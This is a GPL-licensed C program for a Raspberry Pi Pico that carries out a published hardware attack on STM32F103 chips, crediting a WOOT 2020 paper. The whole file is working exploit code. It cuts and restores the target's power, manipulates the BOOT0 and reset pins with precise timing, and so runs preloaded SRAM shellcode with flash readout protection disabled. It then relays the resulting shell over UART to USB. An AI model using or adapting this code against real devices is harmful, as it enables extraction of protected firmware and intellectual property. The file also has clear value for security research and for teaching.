/*
 * Copyright (C) 2023 Patrick Pedersen

 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 *
 * This attack is based on the work of the works of:
 *  Johannes Obermaier, Marc Schink and Kosma Moczek
 * The relevant paper can be found here, particularly section H3:
 *  https://www.usenix.org/system/files/woot20-paper-obermaier.pdf
 * And the relevant code can be found here:
 *  https://github.com/JohannesObermaier/f103-analysis/tree/master/h3
 *
 */

#include <stdio.h>
#include <pico/stdlib.h>
#include <hardware/uart.h>

// Exact steps for attack:
//  Power pin high
//  Wait for button press <- GPIO INPUT
//  Power pin low
//  Wait for reset to go low <- GPIO INPUT
//  Power pin high
//  Wait for SRAM firmware to run (Approx 14.5ms)
//  Set boot0 pin and reset pin to low
//  Wait for reset release (Approx 14.5ms)
//  Set reset to input
//  Wait for SRAM firmware to run (Approx 218.5ms)

#define LED_PIN     PICO_DEFAULT_LED_PIN

#define POWER_PIN   2
#define RESET_PIN   4
#define BOOT0_PIN   5

#define UART_TX_PIN 0
#define UART_RX_PIN 1
#define UART_BAUD   9600
#define UART_ID     uart0
#define DATA_BITS   8
#define STOP_BITS   1
#define PARITY      UART_PARITY_NONE

#define BTN_PIN     24

int main()
{
	stdio_init_all();

	// Init UART
	uart_init(UART_ID, UART_BAUD);
	gpio_set_function(UART_TX_PIN, GPIO_FUNC_UART);
	gpio_set_function(UART_RX_PIN, GPIO_FUNC_UART);
	uart_set_format(UART_ID, DATA_BITS, STOP_BITS, PARITY);
	uart_set_fifo_enabled(UART_ID, true);

	gpio_init(LED_PIN);
	gpio_init(POWER_PIN);
	gpio_init(RESET_PIN);
	gpio_init(BOOT0_PIN);
	gpio_init(BTN_PIN);

	gpio_set_dir(LED_PIN, GPIO_OUT);
	gpio_set_dir(POWER_PIN, GPIO_OUT);
	gpio_set_dir(BOOT0_PIN, GPIO_OUT);
	gpio_set_dir(RESET_PIN, GPIO_IN);
	gpio_set_dir(BTN_PIN, GPIO_IN);
	gpio_pull_up(BTN_PIN);

	// Enable power and prepare BOOT0
	gpio_put(POWER_PIN, 1);
	gpio_put(BOOT0_PIN, 1); // Will be necessary later, might as well set it now
	gpio_put(LED_PIN, 0);

	// Wait for GPIOs to settle
	sleep_ms(500);

	// -- Ensure that the shell-code has been loaded into the DUT's SRAM before preceeding --

	// Wait for attack button press
	while(gpio_get(BTN_PIN)) {
		tight_loop_contents();
	}

	// Drop the power
	gpio_put(LED_PIN, 1);
	gpio_put(POWER_PIN, 0);

	// Wait for reset to go low
	while(gpio_get(RESET_PIN)) {
		tight_loop_contents();
	}

	// Immediately re-enable power
	gpio_put(POWER_PIN, 1);

	// Debugger lock is now disabled and we're now
	// booting from SRAM. Wait for the DUT to run stage 1
	// of the exploit which sets the FPB to jump to stage 2
	// when the PC reaches a reset vector fetch (0x00000004)
	sleep_ms(15);

	// Set BOOT0 to boot from flash. This will trick the DUT
	// into thinking it's running from flash, which will
	// disable readout protection.
	gpio_put(BOOT0_PIN, 0);

	// Reset the DUT
	gpio_set_dir(RESET_PIN, GPIO_OUT);
	gpio_put(RESET_PIN, 0);

	// Wait for reset
	sleep_ms(15);

	// Release reset
	// Due to the FPB, the DUT will now jump to
	// stage 2 of the exploit, which will output a shell
	// over UART with readout protection disabled.
	gpio_set_dir(RESET_PIN, GPIO_IN);

	printf("%c", uart_getc(UART_ID)); // Wait for root shell to print out
	gpio_put(LED_PIN, 0);

	// Forward UART to USB
	while (true) {
		// Forward UART to USB
		if (uart_is_readable(UART_ID)) {
			char data = uart_getc(UART_ID);
			printf("%c", data);
		}

		// Forward USB to UART
		char c = getchar_timeout_us(0);
		if (c != (char)PICO_ERROR_TIMEOUT) {
			uart_putc(UART_ID, c);
		}
	}
}
